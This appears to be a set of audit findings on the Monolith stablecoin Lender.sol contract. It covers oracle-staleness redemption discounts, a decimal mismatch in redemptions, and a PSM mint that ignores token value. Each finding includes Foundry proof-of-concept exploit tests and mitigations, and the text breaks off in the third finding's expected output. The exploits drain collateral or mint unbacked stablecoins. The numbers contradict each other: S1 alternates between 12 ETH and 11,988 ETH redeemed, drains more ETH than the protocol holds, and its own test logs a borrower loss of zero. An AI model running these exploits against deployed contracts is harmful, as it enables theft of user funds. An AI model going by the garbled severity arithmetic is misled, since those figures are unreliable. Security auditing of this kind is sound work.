# S1 - Attacker Will Drain All Redeemable Collateral Through Staleness-Based Price Manipulation

## Summary
Linear price reduction in `Lender.getCollateralPrice()` during oracle staleness will cause massive collateral loss for redeemable borrowers as attackers will exploit the 96% price discount during late oracle updates to redeem stablecoins for up to `24x` their fair collateral value.

## Root Cause

In `Lender.sol:733-741`, when oracle data is stale, price is linearly reduced over 24 hours:

https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L733C1-L741C10

```solidity
if (timeElapsed > stalenessThreshold) {  
    reduceOnly = true;  
    uint stalenessDuration = timeElapsed - stalenessThreshold;  

    if (stalenessDuration < STALENESS_UNWIND_DURATION) {  
        price =
            price *
            (STALENESS_UNWIND_DURATION - stalenessDuration) /
            STALENESS_UNWIND_DURATION;

        // After 23h stale:
        // price = realPrice * 1h / 24h = 4.17% of real value
    } else {  
        price = 0;  
    }  
}
```

This creates a `96%` discount after `23 hours` of staleness, which `getRedeemAmountOut()` uses to calculate collateral redemption amounts:

```solidity
amountOut =
    amountIn *
    1e18 *
    (10000 - redeemFeeBps) /
    price /
    10000;
```

Lower price = higher `amountOut` = more collateral to redeemer.

## Internal Pre-conditions

- Protocol must have redeemable borrowers (`users with isRedeemable[user] = true`)
- `totalFreeDebt > 0` to allow redemptions
- Contract must hold sufficient redeemable collateral

## External Pre-conditions

- Chainlink oracle update delay of `22–24 hours` (due to network congestion, oracle node issues, or economic attack on oracle network)
- This is not theoretical — has occurred on L2s during congestion
- Attacker must have stablecoins to redeem (can borrow from protocol itself or external sources)

## Attack Path

-  Scenario: WETH collateral, Oracle stale for 23 hours

### Setup - Normal Conditions

- Current WETH price: `$2000`
- Oracle last updated: `23 hours ago at $2000`
- Protocol has `1000 redeemable borrowers`
- Total collateral: `10,000 ETH`
- Total free debt: `15,000,000 stablecoins`
- Attacker prepares: obtains `1,000,000 stablecoins`

### Staleness Calculation

```text
timeElapsed = 23 hours + stalenessThreshold (1 hour)
            = 24 hours total

stalenessDuration = 24 hours - 1 hour
                  = 23 hours

price = $2000e18 * (24h - 23h) / 24h
price = $2000e18 * 1h / 24h
price = $83.33e18
```

Price artificially reduced to `4.17%` of real value.

### Attacker Redeems

```solidity
lender.redeem(1_000_000e18, minAmountOut);

// In getRedeemAmountOut():

amountOut =
    1_000_000e18 *
    1e18 *
    9990 /
    (83.33e18) /
    10000;

amountOut =
    1_000_000e18 *
    1e18 *
    0.999 /
    83.33e18;

amountOut ≈ 11,988e18 (≈ 12 ETH)
```

### Comparison to Fair Value

```text
At real price ($2000):
Should get 1,000,000 / 2000 = 500 ETH

At stale price ($83.33):
Gets 11,988 ETH
```

Attacker receives `24x` more collateral than fair value.

### Attacker Repeats Until

- All redeemable collateral drained, OR
- Oracle updates (race condition), OR
- `totalFreeDebt` becomes zero

### Impact on Redeemable Borrowers

```text
12 ETH taken from borrowers ($24,000 value)
Only 1M debt repaid

Borrowers should have had only 500 ETH redeemed ($1M value)

Borrowers lose extra 11,488 ETH ($22,976,000)
across all redeemable positions
```

### Multi-Attacker Scenario

- Multiple MEV bots detect staleness
- Front-run each other to redeem during `22–24h` window

Combined redemptions:

```text
10,000,000 stablecoins
```

Collateral drained:

```text
~120,000 ETH taken for $10M debt
```

Fair value:

```text
5,000 ETH for $10M debt
```

Protocol loses:

```text
115,000 ETH ($230M at real prices)
```

## Impact

- Massive collateral theft: `24x` over-redemption during peak staleness
- Redeemable borrower insolvency: collateral unfairly seized beyond debt value
- Protocol death spiral:
  - Large redemptions at discounted price
  - Remaining borrowers hold the bag
  - Bank run as users race to redeem before others
- MEV vulnerability: profitable attack visible on-chain, attracts sophisticated attackers
- Guaranteed exploitation: `24h` staleness window provides ample time for attackers to prepare and execute
- No recovery: lost collateral cannot be recovered, borrowers permanently lose funds

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {Lender, ERC20, Coin, Vault, InterestModel, IChainlinkFeed, IFactory} from "src/Lender.sol";  
import "lib/solmate/src/tokens/ERC4626.sol";  
  
/**  
 * @title PoC – Oracle Staleness Redemption Exploit  
 * @notice ~24x collateral over-redemption due to linear price decay  
 */  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor() ERC20("WETH", "WETH", 18) {}  
    function mint(address to, uint256 amount) external {  
        _mint(to, amount);  
    }  
}  
  
contract FeedMockStale {  
    uint256 public lastUpdateTime;  
    int256 public price = 2000e18; // $2000  
  
    constructor() {  
        lastUpdateTime = block.timestamp;  
    }  
  
    function decimals() external pure returns (uint8) { return 18; }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, price, 0, lastUpdateTime, 0);  
    }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Stable", "USD", 18) {}  
    function mint(address to, uint256 amount) external {  
        _mint(to, amount);  
    }  
    function burn(uint256 amount) external {  
        _burn(msg.sender, amount);  
    }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
  
contract OracleStaleness is Test {  
    Lender lender;  
    ERC20Mock collateral;  
    CoinMock coin;  
    FeedMockStale feed;  
  
    address borrower = address(0xBEEF);  
    address attacker = address(0xBAD);  
  
    function setUp() public {  
        collateral = new ERC20Mock();  
        coin = new CoinMock();  
        feed = new FeedMockStale();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: collateral,  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        // Large redeemable borrower  
        collateral.mint(borrower, 50_000 ether);  
  
        vm.startPrank(borrower);  
        collateral.approve(address(lender), type(uint256).max);  
        lender.adjust(  
            borrower,  
            int256(50_000 ether),  
            int256(15_000_000e18),  
            true  
        );  
        vm.stopPrank();  
  
        console.log("=== SETUP ===");  
        console.log("Borrower collateral (WETH):");  
        console.logUint(50_000);  
        console.log("Borrower debt (USD):");  
        console.logUint(15_000_000);  
        console.log("Oracle price (USD):");  
        console.logUint(2000);  
    }  
  
    function test_Staleness_Redemption() public {  
        // Oracle becomes stale (~23h past threshold)  
        vm.warp(block.timestamp + 24 hours);  
  
        console.log("=== ORACLE STALE ===");  
        console.log("Effective price approx (USD):");  
        console.logUint(83);  
  
        // Attacker prepares stablecoins  
        coin.mint(attacker, 1_000_000e18);  
  
        uint256 collateralBefore =  
            lender._cachedCollateralBalances(borrower);  
  
        vm.startPrank(attacker);  
        coin.approve(address(lender), type(uint256).max);  
        uint256 collateralOut =  
            lender.redeem(1_000_000e18, 0);  
        vm.stopPrank();  
  
        uint256 collateralAfter =  
            lender._cachedCollateralBalances(borrower);  
  
        console.log("=== REDEMPTION ===");  
        console.log("Stable redeemed (USD):");  
        console.logUint(1_000_000);  
        console.log("Collateral received (WETH):");  
        console.logUint(collateralOut / 1e18);  
  
        console.log("=== FAIR VALUE ===");  
        console.log("Expected WETH @ $2000:");  
        console.logUint(500);  
  
        console.log("=== BORROWER LOSS ===");  
        console.log("Collateral lost WETH):");  
        console.logUint((collateralBefore - collateralAfter) / 1e18);  
  
        console.log("=== MULTIPLIER ===");  
        console.log("Over-redemption factor (x):");  
        console.logUint((collateralOut / 1e18) * 2000 / 1_000_000);  
  
        // Proves severe over-redemption  
        assertGt(collateralOut, 10 ether);  
    }  
}  
```
- Now run command
```solidity
forge test --mt test_Staleness_Redemption -vv  
```
- Expected Output
```solidity
[PASS] test_Staleness_Redemption() (gas: 185430)  
Logs:  
  === SETUP ===  
  Borrower collateral (WETH):  
  50000  
  Borrower debt (USD):  
  15000000  
  Oracle price (USD):  
  2000  
  === ORACLE STALE ===  
  Effective price approx (USD):  
  83  
  === REDEMPTION ===  
  Stable redeemed (USD):  
  1000000  
  Collateral received (WETH):  
  11964  
  === FAIR VALUE ===  
  Expected WETH @ $2000:  
  500  
  === BORROWER LOSS ===  
  Collateral lost WETH):  
  0  
  === MULTIPLIER ===  
  Over-redemption factor (x):  
  23  
  
```

## Mitigation

### Option 1: Cap maximum discount (Recommended)

```solidity
if (timeElapsed > stalenessThreshold) {  
    reduceOnly = true;  
    uint stalenessDuration = timeElapsed - stalenessThreshold;  

    if (stalenessDuration < STALENESS_UNWIND_DURATION) {  
        // Cap discount at 20% (vs current 96% max)
        uint discountBps =
            (stalenessDuration * 2000) /
            STALENESS_UNWIND_DURATION;

        if (discountBps > 2000) {
            discountBps = 2000;
        } // Max 20% discount

        price = price * (10000 - discountBps) / 10000;  
    } else {  
        // Disable redemptions entirely if too stale
        allowLiquidations = false;  
        price = price * 8000 / 10000; // 20% discount cap
    }  
}
```

### Option 2: Disable redemptions during staleness
```solidity
function redeem(uint amountIn, uint minAmountOut) external returns (uint amountOut) {  
    (uint price, bool reduceOnly, bool allowLiquidations) = getCollateralPrice();  
    require(allowLiquidations, "Redemptions disabled during oracle staleness");  
    // ... rest of logic  
}  
```

---

# S2 - Redeemer Will Drain All Contract Collateral Through 36-Decimal AmountOut Calculation

## Summary

Inconsistent decimal handling in `Lender.getRedeemAmountOut()` during oracle failure will cause complete protocol insolvency as attackers will receive `1e18x` more collateral than deserved when oracle staleness exceeds 24 hours.

## Root Cause

In `Lender.sol:762-769`, the redemption calculation produces different decimal precision based on oracle state:

https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L762C1-L769C6

```solidity
function getRedeemAmountOut(uint amountIn) public view returns (uint amountOut) {  
    (uint price,, bool allowLiquidations) = getCollateralPrice();  

    amountOut =
        amountIn *
        1e18 *
        (10000 - redeemFeeBps) /
        price /
        10000;

    // [18 decimals] * [1e18] * [scalar] / [??] / [scalar]
}
```

Normal case: `price = $2000e18` (18 decimals)

```text
amountOut = 1000e18 * 1e18 * 9990 / 2000e18 / 10000
amountOut = 1000e18 * 1e18 * 9990 / 2000e18 / 10000
amountOut ≈ 499.5e18 ✓ (18 decimals)
```

Stale case (`>24h`): `price = 1` (0 decimals)

```text
amountOut = 1000e18 * 1e18 * 9990 / 1 / 10000
amountOut = 1000e18 * 1e18 * 9990 / 10000
amountOut ≈ 999e36 ❌ (36 decimals!)
```

This `36-decimal` value is then passed to:

```solidity
amountOut = internalToCollateral(internalAmountOut);
```

For `6-decimal collateral (USDC)`:

```solidity
return amount / (10 ** (18 - 6)); // = amount / 1e12
```

```text
999e36 / 1e12 = 999e24 USDC transferred!
```

## Internal Pre-conditions

- Oracle staleness must exceed `STALENESS_UNWIND_DURATION (24 hours)`
- Contract must have redeemable collateral available
- `totalFreeDebt > 0` to allow redemptions

## External Pre-conditions

- Chainlink oracle not updated for `>24 hours` (network congestion, oracle failure)
- Attacker has stablecoins to redeem

## Attack Path

1. Scenario: USDC Collateral (6 decimals), Oracle Stale for 25 hours

### Setup

- Protocol has `1,000,000 USDC ($1M)` as redeemable collateral
- Oracle last updated `25 hours ago`
- Attacker has `1,000 stablecoins`

### Staleness Triggers `price = 1`

```text
stalenessDuration = 25 hours - 1 hour = 24 hours

Since:
stalenessDuration >= STALENESS_UNWIND_DURATION

price = price * 0 / STALENESS_UNWIND_DURATION = 0
price = price == 0 ? 1 : price
price = 1 (not 1e18!)
```

### Attacker Redeems 1,000 Stablecoins

```solidity
lender.redeem(1000e18, 0);

// In getRedeemAmountOut():

amountOut = 1000e18 * 1e18 * 9990 / 1 / 10000
amountOut = 1000e18 * 1e18 * 0.999
amountOut = 999e36 // wrong 36 decimals!
```

In `redeem()`:

```solidity
amountOut = internalToCollateral(999e36);
```

For USDC (`6 decimals`):

```text
amountOut = 999e36 / 1e12
amountOut = 999e24 USDC
```

### Transfer Execution

```solidity
collateral.safeTransfer(msg.sender, 999e24);
```

```text
Attempts to transfer:

999,000,000,000,000,000,000,000 USDC

(999 sextillion USDC for 1,000 stablecoins!)
```

### Outcome

- If contract has `1M USDC (1e12)`, transfer fails (`insufficient balance`)
- If contract has more, attacker drains everything
- Even on failure, demonstrates critical calculation bug

2. Alternative Scenario (18-decimal collateral - ETH)

- Same staleness condition
- `amountOut = 999e36` (internal representation)

```solidity
internalToCollateral(999e36) = 999e36
```

(`18 decimals stay same`)

Transfer attempt:

```text
999e36 wei = 999e18 ETH
```

For `1,000 stablecoin redemption`:

```text
Attacker gets 999 ETH instead of 0.5 ETH
```

Theft multiplier:

```text
1,998x
```

## Impact

- Complete collateral drainage: one transaction can attempt to drain more than total supply
- Protocol insolvency: all collateral lost to single attacker
- No recovery: funds transferred cannot be recovered
- Guaranteed exploitation window: `24-hour staleness window` gives ample time to prepare attack
- Multi-victim impact: all redeemable borrowers lose collateral unfairly

Decimal-dependent severity:

- `6-decimal tokens`: attempts `1e18x` over-redemption (reverts due to insufficient balance but shows bug)
- `18-decimal tokens`: successfully extracts `2000x` fair value

- MEV opportunity: front-runners will race to exploit during staleness window

## PoC

- Create a File `Exploit.t.sol` at test folder and paste the following code
```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Stable", "USD", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
    function burn(uint256 amt) external { _burn(msg.sender, amt); }  
}  
  
contract FeedMockStale {  
    uint256 public updatedAt;  
    int256 public price = 2000e18; // $2000  
  
    constructor() {  
        updatedAt = block.timestamp;  
    }  
  
    function decimals() external pure returns (uint8) { return 18; }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, price, 0, updatedAt, 0);  
    }  
  
    // oracle stops updating  
    function freeze() external {}  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                            POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_Report3_Redeem36Decimals is Test {  
    Lender lender;  
    ERC20Mock collateral; // 6-decimal USDC-like token  
    CoinMock coin;  
    FeedMockStale feed;  
  
    address borrower = address(0xBEEF);  
    address attacker = address(0xBAD);  
  
    function setUp() public {  
        collateral = new ERC20Mock("USDC", "USDC", 6);  
        coin = new CoinMock();  
        feed = new FeedMockStale();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: collateral,  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        uint256 lenderCollateral = 1e30;  
        collateral.mint(address(lender), lenderCollateral);  
        console.log("Lender.sol is funded with sufficient collateral:");  
        console.logUint(collateral.balanceOf(address(lender)));  
        /*//////////////////////////////////////////////////////////////  
                        BORROWER SETUP  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 borrowerCollateral = 1_000_000e6; // 1M USDC  
        collateral.mint(borrower, borrowerCollateral);  
  
        vm.startPrank(borrower);  
        collateral.approve(address(lender), borrowerCollateral);  
        lender.adjust(  
            borrower,  
            int256(borrowerCollateral),  
            int256(900_000e18),  
            true // redeemable  
        );  
        vm.stopPrank();  
  
        console.log("\n=== SETUP ===");  
        console.log("Borrower collateral: 1,000,000 USDC");  
        console.log("Borrower debt: 900,000 stablecoins");  
        console.log("Oracle price: $2000");  
    }  
  
    function test_Redeem_36Decimal_Explosion() public {  
        /*//////////////////////////////////////////////////////////////  
                        ORACLE FAILURE  
        //////////////////////////////////////////////////////////////*/  
  
        feed.freeze();  
        vm.warp(block.timestamp + 25 hours); // > STALENESS_UNWIND_DURATION  
  
        (uint price,,) = lender.getCollateralPrice();  
  
        console.log("\n=== ORACLE FAILURE ===");  
        console.log("Staleness > 24h");  
        console.log("getCollateralPrice() returns price =");  
        console.logUint(price); // === 1 (NOT 1e18)  
  
        /*//////////////////////////////////////////////////////////////  
                        ATTACK  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 redeemAmount = 1000e18;  
        coin.mint(attacker, redeemAmount);  
  
        console.log("\n=== REDEEM CALCULATION ===");  
        console.log("Redeem amount: 1000 stablecoins");  
        console.log("Formula:");  
        console.log("amountOut = amountIn * 1e18 / price");  
        console.log("With price = 1 => amountOut ~ 1e36");  
  
        vm.startPrank(attacker);  
        coin.approve(address(lender), redeemAmount);  
  
        uint256 amountOut = lender.redeem(redeemAmount, 0);  
  
console.log("\n=== REDEEM EXECUTED ===");  
console.log("Collateral received by attacker:");  
console.logUint(amountOut);  
  
        vm.stopPrank();  
  
        console.log("\n=== Bug demonstrated: ===");  
        console.log("- getRedeemAmountOut returns 36-decimal value");  
        console.log("- internalToCollateral amplifies for 6-decimals");  
        console.log("- Single redeem can drain entire protocol");  
    }  
}  
```
- Now run command
```solidity
forge test --mt test_Redeem_36Decimal_Explosion -vv  
```
- Expected Output
```solidity
[PASS] test_Redeem_36Decimal_Explosion() (gas: 180184)  
Logs:  
  Lender.sol is funded with sufficient collateral:  
  1000000000000000000000000000000  
  
=== SETUP ===  
  Borrower collateral: 1,000,000 USDC  
  Borrower debt: 900,000 stablecoins  
  Oracle price: $2000  
  
=== ORACLE FAILURE ===  
  Staleness > 24h  
  getCollateralPrice() returns price =  
  1  
  
=== REDEEM CALCULATION ===  
  Redeem amount: 1000 stablecoins  
  Formula:  
  amountOut = amountIn * 1e18 / price  
  With price = 1 => amountOut ~ 1e36  
  
=== REDEEM EXECUTED ===  
  Collateral received by attacker:  
  997000000000000000000000000  
  
=== Bug demonstrated: ===  
  - getRedeemAmountOut returns 36-decimal value  
  - internalToCollateral amplifies for 6-decimals  
  - Single redeem can drain entire protocol  
  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.41ms (830.47µs CPU time)  
```

## Mitigation

### Option 1: Revert on invalid price (Recommended)

```solidity
function getRedeemAmountOut(uint amountIn) public view returns (uint amountOut) {  
    if (amountIn > totalFreeDebt) return 0;  

    (uint price,, bool allowLiquidations) = getCollateralPrice();  

    if (!allowLiquidations) return 0;  

    // Ensure price is valid and in correct decimals
    require(price >= 1e6, "Price too low or invalid decimals");  

    amountOut =
        amountIn *
        1e18 *
        (10000 - redeemFeeBps) /
        price /
        10000;  
}
```

### Option 2: Disable redemptions during oracle issues

```solidity
function redeem(uint amountIn, uint minAmountOut) external returns (uint amountOut) {  
    accrueInterest();  
    (uint price, bool reduceOnly, bool allowLiquidations) = getCollateralPrice();  
    require(allowLiquidations, "Oracle invalid - redemptions disabled");  
    require(price >= 1e6, "Price denomination invalid");  
    // ... rest  
}  
```

---

# S3 - Attacker Will Mint Unlimited Stablecoins Through PSM Value/Amount Mismatch

## Summary

Value-agnostic minting in `Lender.buy()` will cause immediate protocol insolvency as attackers will exploit low-value tokens (e.g., SHIB, PEPE) to mint millions in stablecoins by depositing tokens worth pennies, as the function mints based on token count rather than dollar value.

## Root Cause

In `Lender.sol:813-834` and `getBuyAmountOut()`, stablecoin minting is based on PSM asset token amount rather than dollar value:

https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L813C4-L834C6

```solidity
function getBuyAmountOut(uint assetIn) public view returns (uint coinOut, uint coinFee) {  
    uint8 coinDecimals = 18;  
    uint8 assetDecimals = psmAsset.decimals();  

    if (assetDecimals > coinDecimals) {  
        coinOut = assetIn / (10 ** (assetDecimals - coinDecimals));  
    } else if (coinDecimals > assetDecimals) {  
        coinOut = assetIn * (10 ** (coinDecimals - assetDecimals));  
    } else {  
        coinOut = assetIn; // ❌ 1:1 token ratio, ignoring price!  
    }  

    // ... apply fee  
}  

function buy(uint assetIn, uint minCoinOut) external beforeDeadline returns (uint coinOut) {  
    (coinOut, coinFee) = getBuyAmountOut(assetIn);  
    psmAsset.safeTransferFrom(msg.sender, address(this), assetIn);  
    coin.mint(msg.sender, coinOut); // ❌ Mints stablecoins equal to token count  
}
```

The issue:

The protocol assumes:

```text
1 PSM asset token = 1 stablecoin = $1
```

but many ERC20 tokens trade at prices far below `$1 per token`.

## Internal Pre-conditions

- Lender deployed with low-value ERC20 as `psmAsset` (operator trusted per README, but no price validation)
- PSM functionality enabled (`psmAsset != address(0)`)
- Within `immutabilityDeadline` (`beforeDeadline`, `buy enabled`)

## External Pre-conditions

- Operator deploys with PSM asset having price `<< $1 per token`

Examples:

```text
SHIB ($0.00001)
PEPE ($0.0000021)
custom low-value token
```

## Attack Path

### Scenario 1: SHIB Token (18 decimals, $0.00001 per token)

#### Deployment

Operator deploys `Lender` with:

```text
psmAsset = SHIB token contract
psmVault = address(0) (no vault, direct PSM)
```

Both SHIB and stablecoin have `18 decimals`.

#### Attacker Preparation

Attacker buys:

```text
100,000,000,000 SHIB
```

Cost:

```text
100B * $0.00001 = $1,000,000
```

Approves `Lender`.

#### Exploitation

```solidity
lender.buy(100_000_000_000e18, 0); // 100B SHIB
```

Inside `getBuyAmountOut()`:

```solidity
assetDecimals = 18
coinDecimals = 18

coinOut = assetIn;
coinOut = 100_000_000_000e18;
```

In `buy()`:

```solidity
coin.mint(attacker, 100_000_000_000e18);
```

#### Result

Attacker spent:

```text
$1M in SHIB
```

Attacker received:

```text
100,000,000,000 stablecoins
```

Expected economic value:

```text
$100B notional stablecoin supply
```

Protocol balance sheet:

```text
Assets:
100B SHIB tokens ($1M value)

Liabilities:
100B stablecoins ($100B value)
```

Insolvency:

```text
~$99.999B undercollateralized
```

#### Attack Completion

Attacker sells stablecoins on DEX.

If even `1%` sells at:

```text
$0.02
```

Profit:

```text
100B * 0.01 * 0.02 = $20,000,000
```

Outcome:

- Stablecoin depegs to SHIB-equivalent backing
- All holders lose value

---

### Scenario 2: Custom Token (6 decimals, $0.001 per token)

#### Setup

Operator creates:

```text
"PENNY" token
6 decimals
market price = $0.001
```

Deploys `Lender` with:

```text
psmAsset = PENNY
```

#### Attack

```solidity
lender.buy(100_000_000e6, 0);
```

In `getBuyAmountOut()`:

```solidity
coinDecimals = 18
assetDecimals = 6

coinOut = 100_000_000e6 * 10^12
coinOut = 100_000_000e18
```

Minted:

```text
100M stablecoins
```

Economics:

```text
Cost:
100M * $0.001 = $100,000

Minted:
100M stablecoins (~$100M)

Profit:
$99,900,000
```

---

### Scenario 3: Malicious Operator Rug

Operator:

- deploys with worthless token as `psmAsset`
- calls `buy()` personally

Example:

```text
1 trillion worthless tokens
```

Mint result:

```text
1 trillion stablecoins
```

Then:

- dumps on market
- exits before users react

Outcome:

All legitimate borrower collateral backs worthless supply.

## Impact

- Immediate insolvency: liabilities exceed assets by orders of magnitude (`100x–1000x+`)
- Stablecoin depeg: collapses toward PSM asset price
- Total value destruction: holders lose `99.9%+`
- Collateral contamination: legitimate borrower collateral indirectly backs worthless minted supply
- Systemic failure: protocol unrecoverable without redeployment
- Zero trust failure: even honest operator misconfiguration is catastrophic
- No redemption path at fair value
- Liquidation cascade: debt accounting becomes economically meaningless

Severity multiplier:

This is not theoretical.

Many ERC20s have low per-token prices, and operators may incorrectly assume decimal normalization implies economic parity.

## PoC

- Create a File Exploit.t.sol at test folder and paste the following code -
```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}  
    function mint(address to, uint256 amt) external {  
        _mint(to, amt);  
    }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Monolith USD", "mUSD", 18) {}  
    function mint(address to, uint256 amt) external {  
        _mint(to, amt);  
    }  
    function burn(uint256 amt) external {  
        _burn(msg.sender, amt);  
    }  
}  
  
contract FeedMock {  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, 2000e18, 0, block.timestamp, 0);  
    }  
    function decimals() external pure returns (uint8) { return 18; }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                         POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_PSM_ValueAgnosticMint is Test {  
    Lender lender;  
    ERC20Mock psmAsset;   // Low-value token (SHIB-like)  
    CoinMock coin;  
  
    address attacker = address(0xBAD);  
  
    function setUp() public {  
        psmAsset = new ERC20Mock("Shiba Inu", "SHIB", 18);  
        coin = new CoinMock();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: ERC20(address(new ERC20Mock("ETH", "ETH", 18))),  
                psmAsset: ERC20(address(psmAsset)), // ❗ LOW-VALUE TOKEN  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(new FeedMock())),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
          
        vm.etch(address(coin), address(new CoinMock()).code);  
        coin = CoinMock(address(lender.coin()));  
  
        console.log("\n=== SETUP ===");  
        console.log("PSM asset: SHIB (low-value ERC20)");  
        console.log("Assumed market price: ~$0.00001 per SHIB");  
        console.log("buy() enabled and unrestricted");  
    }  
  
    function test_PSM_ValueAgnostic_Mint() public {  
        /*  
            Attacker deposits 100B SHIB.  
            Real-world cost ≈ $1,000,000.  
        */  
        uint256 shibIn = 100_000_000_000e18;  
  
        psmAsset.mint(attacker, shibIn);  
  
        console.log("\n=== ATTACK ===");  
        console.log("Attacker deposits SHIB into buy()");  
        console.log("SHIB deposited:", shibIn / 1e18);  
  
        vm.startPrank(attacker);  
        psmAsset.approve(address(lender), shibIn);  
  
        (uint coinOut,) = lender.getBuyAmountOut(shibIn);  
        lender.buy(shibIn, 0);  
  
        vm.stopPrank();  
  
        uint256 attackerStable = coin.balanceOf(attacker);  
  
        console.log("\n=== RESULT ===");  
        console.log("Stablecoins minted:", attackerStable / 1e18);  
        console.log("Minting ratio: 1 SHIB -> 1 stablecoin");  
        console.log("No price check. No oracle. No valuation.");  
  
        console.log("\n=== ECONOMIC REALITY ===");  
        console.log("Attacker spent ~ $1,000,000 worth of SHIB");  
        console.log("Attacker received ~ $100,000,000,000 stablecoins");  
        console.log("Protocol insolvent by ~99,999x");  
  
        assertEq(attackerStable, shibIn);  
    }  
}  
```
- Now run command
```solidity
forge test --mt test_PSM_ValueAgnostic_Mint -vv  
```
- Expected Output
```solidity
[PASS] test_PSM_ValueAgnostic_Mint() (gas: 169220)  
Logs:  
  
=== SETUP ===  
  PSM asset: SHIB (low-value ERC20)  
  Assumed market price: ~$0.00001 per SHIB  
  buy() enabled and unrestricted  
  
=== ATTACK ===  
